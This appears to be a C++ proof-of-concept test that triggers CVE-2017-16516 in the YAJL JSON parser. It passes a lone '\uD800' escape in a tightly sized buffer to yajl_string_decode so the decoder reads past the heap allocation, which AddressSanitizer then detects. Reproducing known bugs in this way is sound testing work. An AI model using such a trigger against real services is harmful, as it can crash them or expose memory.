#include <cstdio>
#include <cstring>
#include <cstdlib>

// Direct access to internal YAJL function
extern "C" {
    void yajl_string_decode(unsigned char *str, unsigned int *len);
}

int main() {
    printf("Testing CVE-2017-16516 by calling yajl_string_decode() directly\n\n");
    
    // Test 1: High surrogate at end of tightly allocated buffer
    // The string is: \uD800
    // After parsing the 4 hex digits, code does end++ then reads str[end] and str[end+1]
    // With tight allocation, this will read past the buffer
    
    const char *test_str = "\\uD800";
    unsigned int len = strlen(test_str);
    
    // Allocate exactly the size needed (no extra space)
    unsigned char *tight_buffer = (unsigned char*)malloc(len + 1);
    memcpy(tight_buffer, test_str, len);
    tight_buffer[len] = '\0';
    
    printf("Test 1: High surrogate at end\n");
    printf("Input: %s (length: %u)\n", tight_buffer, len);
    printf("Calling yajl_string_decode()...\n");
    
    // This should trigger heap-buffer-overflow when ASAN is enabled
    // The decoder will read str[6] and str[7] which are past the allocated buffer
    yajl_string_decode(tight_buffer, &len);
    
    printf("Decoded length: %u\n", len);
    printf("If you see this, the vulnerability was NOT triggered\n");
    
    free(tight_buffer);
    
    return 0;
}
